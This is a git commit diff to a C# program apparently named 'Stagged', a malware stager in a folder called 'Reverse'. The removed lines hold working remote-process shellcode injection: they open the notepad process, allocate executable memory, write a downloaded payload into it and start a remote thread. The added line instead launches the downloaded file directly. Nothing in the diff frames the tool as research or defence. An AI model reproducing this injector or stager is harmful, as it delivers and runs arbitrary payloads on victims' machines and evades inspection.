f8393dee49ba3631238bdeeef1bad2ea6d596ac3
PepeTh3Fr0g <81581448+PepeTh3Fr0g@users.noreply.github.com>
2021-05-19 20:21:43 +0200

    modification cool
    modification cool

--- Reverse/Check all/Stagged/Stagged/Program.cs
+++ Reverse/Check all/Stagged/Stagged/Program.cs
@@ -4,9 +4,6 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Net.Http;
-using System.Reflection;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
 using System.Net;
 using System.IO;
 
@@ -14,25 +11,6 @@ namespace Stagged
 {
     class Program
     {
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-        public static extern IntPtr GetModuleHandle(string lpModuleName);
-
-        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-
 
 
         static void Main(string[] args)
@@ -57,31 +35,9 @@ namespace Stagged
 
             //Remplis le tableau payload des octets du fichier télécharger
             //byte[] payload = File.ReadAllBytes(download_path + "\\" + name_changed); 
-            byte[] payload = File.ReadAllBytes(download_path + "\\" + name_changed);
+            System.Diagnostics.Process.Start(download_path + "\\" + name_changed);
 
-
-
-            Process targetProcess = Process.GetProcessesByName("notepad")[0];
-            IntPtr process_handle = OpenProcess(0x1F0FFF, false, targetProcess.Id);
-            IntPtr memory_allocation_variable = VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(payload.Length), 0x00001000, 0x40);
-
-            // Write the shellcode
-            UIntPtr bytesWritten;
-            WriteProcessMemory(process_handle, memory_allocation_variable, payload, (uint)(payload.Length), out bytesWritten);
-
-            // Create a thread that will call LoadLibraryA with allocMemAddress as argument
-
-            if (CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation_variable, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
-            {
-                Console.Write("Injection done!");
-            }
-            else
-            {
-                Console.Write("Injection failed!");
-            }
-            
-
-            string aaa = Console.ReadLine();
+                        
 
         }
     }
